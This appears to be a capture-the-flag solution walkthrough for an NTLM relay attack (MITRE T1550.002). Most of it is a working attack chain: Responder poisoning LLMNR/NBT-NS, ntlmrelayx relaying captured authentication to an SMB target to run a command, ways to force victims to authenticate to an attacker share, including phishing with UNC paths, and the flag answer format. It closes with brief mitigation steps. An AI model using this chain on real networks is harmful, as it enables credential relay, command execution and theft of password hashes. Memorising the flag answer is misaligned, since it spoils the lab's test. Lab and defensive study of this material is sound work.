# T1550.002 – NTLM Relay Attack | Solution Walkthrough
**Difficulty:** Expert | **OS:** Windows | **MITRE:** T1550.002

## Background
NTLM Relay: attacker intercepts NTLM auth challenge (via Responder poisoning of LLMNR/NBT-NS)
and relays it to a target system where the victim user has admin access.

## Step 1 – Verify SMB Signing Disabled
```powershell
Get-SmbServerConfiguration | Select RequireSecuritySignature, EnableSecuritySignature
# RequireSecuritySignature : False  ← VULNERABLE TO RELAY!
```

## Step 2 – Attack Chain (from Linux attacker)
```bash
# Terminal 1: Start ntlmrelayx to relay to target
python3 ntlmrelayx.py -t smb://192.168.1.10 -smb2support -c "type C:\Windows\System32\flag_T1550_002b.txt > C:\Users\Public\relay_flag.txt"

# Terminal 2: Start Responder (poison LLMNR/NBT-NS)
python3 Responder.py -I eth0 -dwv
# Disable SMB/HTTP in Responder.conf first (ntlmrelayx handles those)
```

## Step 3 – Trigger Authentication
```powershell
# On victim machine — any outbound NTLM auth triggers it:
# - Navigate to \\attacker\share in Explorer
# - dir \\attacker\nonexistent
# - net use \\attacker\share
# Or send a phishing email with UNC path
```

## Step 4 – Result
```bash
# ntlmrelayx intercepts the NTLM challenge/response and relays it to target
# If victim is local admin on target: SAM dump or command execution
# HACKTIFY{NTLM_RELAY_<hostname>}
```

## Mitigation
- Enable SMB signing: `Set-SmbServerConfiguration -RequireSecuritySignature $true`
- Disable LLMNR: `HKLM\SOFTWARE\Policies\Microsoft\Windows NT\DNSClient\EnableMulticast = 0`
- Disable NBT-NS via DHCP options or network adapters
